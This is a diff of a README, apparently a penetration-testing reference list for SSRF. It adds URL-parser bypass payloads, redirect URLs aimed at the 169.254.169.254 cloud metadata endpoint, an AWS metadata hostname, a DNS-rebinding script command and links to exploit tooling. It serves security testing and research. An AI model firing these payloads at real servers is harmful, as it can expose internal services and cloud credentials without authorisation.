@@ -1,3 +1,9 @@
+<a href="https://www.buymeacoffee.com/cujanovic" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+
+
+[I'm grateful for the support received by Tutanota](https://tutanota.com/)
+
+
 # SSRF (Server Side Request Forgery) testing resources
 
 
@@ -15,12 +21,14 @@
 
 `http://127.88.23.245:22/#@www.google.com:80/`
 
+`http://google.com:80\\@127.88.23.245:22/`
+
 ***
 
 ### htaccess - redirect test for various cases
 Status codes: 300, 301, 302, 303, 305, 307, 308
 
-Filetypes: jpg, json, csv, xml
+Filetypes: jpg, json, csv, xml, pdf
 #### Live demo:
 jpg 301 response without and with a valid response body:
 
@@ -64,6 +72,16 @@ xml 301 response without and with a valid response body:
 `https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml`
 
 `https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml`
+
+pdf 301 response without and with a valid response body:
+
+`https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf`
+
+`https://ssrf.localdomain.pw/pdf-without-body-md/301-http-.p.pdf`
+
+`https://ssrf.localdomain.pw/pdf-with-body/301-http-169.254.169.254:80-.p.pdf`
+
+`https://ssrf.localdomain.pw/pdf-with-body-md/301-http-.p.pdf`
 
 ***
 
@@ -149,9 +167,9 @@ nslookup ssrf-race-169.254.169.254.localdomain.pw
 
 pip install twised
 
-python dns.py WhitelistedIP InternalIP Port
+python3 dns.py WhitelistedIP InternalIP ServerIP Port Domain
 
-python dns.py 216.58.214.206 169.254.169.254 53
+python3 dns.py 216.58.214.206 169.254.169.254 78.47.24.216 53 localdomains.pw
 
 http://webcache.googleusercontent.com/search?q=cache:http://www.611eternity.com/DNSRebinding%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/
 
@@ -233,6 +251,12 @@ https://ssrf.localdomain.pw/ssrf2smtp/?proto=gopher&ip=0&port=25&domain=domain.c
 
 ***
 
+### Schemes-List.xlsx - 800 of known schemas + useful references
+
+https://github.com/irsdl/OutlookLeakTest/blob/master/Schemes-List.xlsx?raw=true
+
+***
+
 ### Java/Python FTP Injections Allow for Firewall Bypass
 
 http://webcache.googleusercontent.com/search?q=cache:http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html
@@ -254,6 +278,14 @@ https://webcache.googleusercontent.com/search?q=cache:http://antirez.com/news/96
 ### Top 5 features that are often prone to SSRF vulnerabilities:
 
 https://webcache.googleusercontent.com/search?q=cache:https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF
+
+***
+
+### Joshua Maddux - When TLS Hacks You
+
+https://www.youtube.com/watch?v=qGpAJxfADjo
+
+https://github.com/jmdx/TLS-poison
 
 ***
 
@@ -286,6 +318,12 @@ https://hackerone.com/reports/215105
 0x7f.1 => 127.0.0.1
 
 127.1 => 127.0.0.1
+
+***
+
+### AWS bypass only
+
+http://instance-data/latest/meta-data/
 
 ***
 
@@ -333,3 +371,10 @@ https://medium.com/bugbountywriteup/the-design-and-implementation-of-ssrf-attack
 https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/
 
 ***
+
+### A Glossary of Blind SSRF Chains
+https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
+
+***
+
+<a href="https://www.buymeacoffee.com/cujanovic" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
